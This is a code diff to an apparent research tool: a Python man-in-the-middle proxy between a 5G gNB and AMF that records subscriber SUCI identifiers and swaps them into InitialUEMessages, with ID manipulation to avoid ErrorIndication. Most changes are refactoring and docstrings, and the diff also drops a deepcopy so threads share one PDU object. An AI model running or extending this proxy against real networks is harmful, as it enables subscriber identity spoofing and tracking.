@@ -11,7 +11,7 @@ from threading import Lock
 
 
 # Config 
-_NGAP_PDU_PROTO = NGAP_PDU_Descriptions.NGAP_PDU
+NGAP_PDU_PROTO = NGAP_PDU_Descriptions.NGAP_PDU
 
 AMF_IP      = os.getenv("AMF_IP","127.0.0.1")
 AMF_PORT    = int(os.getenv("AMF_PORT","38412"))
@@ -39,6 +39,81 @@ PROC_DOWNLINK_NAS = 4
 
 # PPID for AMF, else failure
 NAS_PPID = 60
+
+
+# NGAP helpers
+def NGAP_PDU():
+    return NGAP_PDU_PROTO
+
+
+def decode_ngap(data: bytes):
+    pdu = NGAP_PDU()
+    try:
+        pdu.from_aper(data)
+        return pdu
+    except Exception as e:
+        print(f"ERROR - NGAP decode failed: {e}")
+        return None
+
+def get_procedure_code(pdu) -> int | None:
+    try:
+        return pdu.get_val()[1]["procedureCode"]
+    except Exception:
+        return None
+
+def get_ran_ue_id(pdu) -> int | None:
+    try:
+        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
+        for ie in ies:
+            if ie["id"] == 85:
+                return ie["value"][1]
+    except Exception:
+        pass
+    return None
+
+
+def get_nas_msg_type(nas_bytes: bytes) -> int | None:
+    try:
+        msg, err = parse_NAS5G(nas_bytes)
+        if err:
+            return None
+        return msg["5GMMHeader"]["Type"].get_val()
+    except Exception as e:
+        print(f"ERROR - get_nas_msg_type: {e}")
+        return None
+
+def get_nas_msg_fail_cause(nas_bytes: bytes) -> int | None:
+    try:
+        msg, err = parse_NAS5G(nas_bytes)
+        if err:
+            return None
+
+        return msg["5GMMCause"].get_val()[0]
+    except Exception:
+        return None
+    
+
+def get_nas_pdu(pdu) -> bytes | None:
+    try:
+        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
+        for ie in ies:
+            if ie["id"] == 38:
+                return ie["value"][1]
+    except Exception:
+        pass
+    return None
+
+def set_nas_pdu(pdu, new_nas: bytes) -> bytes | None:
+    try:
+        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
+        for ie in ies:
+            if ie["id"] == 38:
+                ie["value"] = (ie["value"][0], new_nas)
+                break
+        return pdu.to_aper()
+    except Exception as e:
+        print(f"ERROR - NGAP rebuild failed: {e}")
+        return None
 
 # JSON helpers
 
@@ -129,81 +204,7 @@ def get_suci_count() -> int:
         return None
 
 
-# NGAP helpers
-def NGAP_PDU():
-    return deepcopy(_NGAP_PDU_PROTO)
-
-
-def decode_ngap(data: bytes):
-    pdu = NGAP_PDU()
-    try:
-        pdu.from_aper(data)
-        return pdu
-    except Exception as e:
-        print(f"ERROR - NGAP decode failed: {e}")
-        return None
-
-def get_procedure_code(pdu) -> int | None:
-    try:
-        return pdu.get_val()[1]["procedureCode"]
-    except Exception:
-        return None
-
-def get_ran_ue_id(pdu) -> int | None:
-    try:
-        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
-        for ie in ies:
-            if ie["id"] == 85:
-                return ie["value"][1]
-    except Exception:
-        pass
-    return None
-
-
-def get_nas_msg_type(nas_bytes: bytes) -> int | None:
-    try:
-        msg, err = parse_NAS5G(nas_bytes)
-        if err:
-            return None
-        return msg["5GMMHeader"]["Type"].get_val()
-    except Exception as e:
-        print(f"ERROR - get_nas_msg_type: {e}")
-        return None
-
-def get_nas_msg_fail_cause(nas_bytes: bytes) -> int | None:
-    try:
-        msg, err = parse_NAS5G(nas_bytes)
-        if err:
-            return None
-
-        return msg["5GMMCause"].get_val()[0]
-    except Exception:
-        return None
-    
-
-def get_nas_pdu(pdu) -> bytes | None:
-    try:
-        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
-        for ie in ies:
-            if ie["id"] == 38:
-                return ie["value"][1]
-    except Exception:
-        pass
-    return None
-
-def set_nas_pdu(pdu, new_nas: bytes) -> bytes | None:
-    try:
-        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
-        for ie in ies:
-            if ie["id"] == 38:
-                ie["value"] = (ie["value"][0], new_nas)
-                break
-        return pdu.to_aper()
-    except Exception as e:
-        print(f"ERROR - NGAP rebuild failed: {e}")
-        return None
-
-# PREVENT ERRORINDIATION
+# Prevent ERRORINDICATION by changing the AMF-UE-NGAP-ID to earlier version
 def get_amf_ue_ngap_id(pdu) -> int | None:
     try:
         root = pdu.get_val()
@@ -271,13 +272,14 @@ _state_lock = Lock()
 
 
 def init_attack_state(ran_ue_id: int):
+    "Initiates the attack state per UE"
     with _state_lock:
         _attack_state[ran_ue_id] = {
             "phase": "initial", # initial | replay | reset | success | failure
-            "suci_idx": 0,
+            "suci_idx": 0, # SUCI to replace with in list
             "suci_count": get_suci_count(),
             "initial_ue_message": None,
-            "amf-id": 0,
+            "amf-id": 0, # Prevent Errorindication
             "fail_count": 0, # RESET & SYNC
         }
 
@@ -294,15 +296,9 @@ def set_phase(ran_ue_id: int, phase: str, **kwargs):
 
 
 
-
-
-
-
-
-
-
 # ATTACK FUNCTION
 def replace_suci(nas_bytes: bytes, state: dict | None = None) -> bytes | None:
+    """ Replaces the SUCI fields in the InitialUEMessage """
     try:
         msg, err = parse_NAS5G(nas_bytes)
         if err:
@@ -350,9 +346,9 @@ def replace_suci(nas_bytes: bytes, state: dict | None = None) -> bytes | None:
         return None
 
 
-
 # RECORD MODE
 def record_suci(nas_bytes: bytes) -> None:
+    """ Records the SUCI fields from a IntialUEMessage into a JSON file"""
     try:
         msg, err = parse_NAS5G(nas_bytes)
         if err:
@@ -575,6 +571,7 @@ def downlink(gnb_sock, amf_sock):
 
 # Connection handler
 def handle(gnb_sctp):
+    """ Creating connection threads and forwarding towards AMF """
     print(f" gNB connected — opening AMF {AMF_IP}:{AMF_PORT}")
     amf_sctp = sctp.sctpsocket_tcp(socket.AF_INET)
 
